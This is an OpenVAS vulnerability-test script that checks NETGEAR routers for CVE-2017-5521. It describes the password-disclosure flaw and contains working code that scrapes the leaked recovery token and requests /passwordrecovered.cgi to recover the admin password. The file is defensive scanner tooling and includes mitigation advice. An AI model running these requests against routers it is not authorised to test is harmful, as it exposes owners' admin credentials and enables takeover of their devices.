###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_cve-2017-5521.nasl 11863 2018-10-12 09:42:02Z mmartin $
#
# NETGEAR Devices Password Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106536");
  script_version("$Revision: 11863 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 11:42:02 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-01-23 12:10:26 +0700 (Mon, 23 Jan 2017)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2017-5521");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("NETGEAR Devices Password Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8443);

  script_tag(name:"summary", value:"Multiple NETGEAR devices are prone to a admin password disclosure
vulnerability");

  script_tag(name:"vuldetect", value:"Tries to recover the admin password.");

  script_tag(name:"insight", value:"An issue was discovered on NETGEAR R8500, R8300, R7000, R6400, R7300,
R7100LG, R6300v2, WNDR3400v3, WNR3500Lv2, R6250, R6700, R6900, and R8000 devices. They are prone to password
disclosure via simple crafted requests to the web management server. The bug is exploitable remotely if the
remote management option is set, and can also be exploited given access to the router over LAN or WLAN. When
trying to access the web panel, a user is asked to authenticate; if the authentication is canceled and password
recovery is not enabled, the user is redirected to a page that exposes a password recovery token. If a user
supplies the correct token to the page /passwordrecovered.cgi?id=TOKEN (and password recovery is not enabled),
they will receive the admin password for the router.

If password recovery is set the exploit will fail, as it will ask the user for the recovery questions that were
previously set when enabling that feature. This is persistent (even after disabling the recovery option, the
exploit will fail) because the router will ask for the security questions.");

  script_tag(name:"affected", value:"NETGEAR R8500, R8300, R7000, R6400, R7300, R7100LG, R6300v2, WNDR3400v3,
WNR3500Lv2, R6250, R6700, R6900 and R8000 devices");

  script_tag(name:"solution", value:"As a mitigation manually enable the password recovery feature on your
device and ensure that remote management is disabled.");

  script_xref(name:"URL", value:"http://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 8443);

res = http_get_cache(port: port, item: "/");

if ('Basic realm="NETGEAR' >!< res)
  exit(0);

token = eregmatch(pattern: "unauth.cgi\?id=([0-9]+)", string: res);
if (isnull(token[1]))
  exit(0);

token = token[1];

if (http_vuln_check(port: port, url: "/passwordrecovered.cgi?id=" + token,
                    pattern: "You can now log into the router using username .* and this recovered password",
                    extra_check: "Router Admin Password")) {
  report = report_vuln_url(port: port, url: "/passwordrecovered.cgi?id=" + token);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
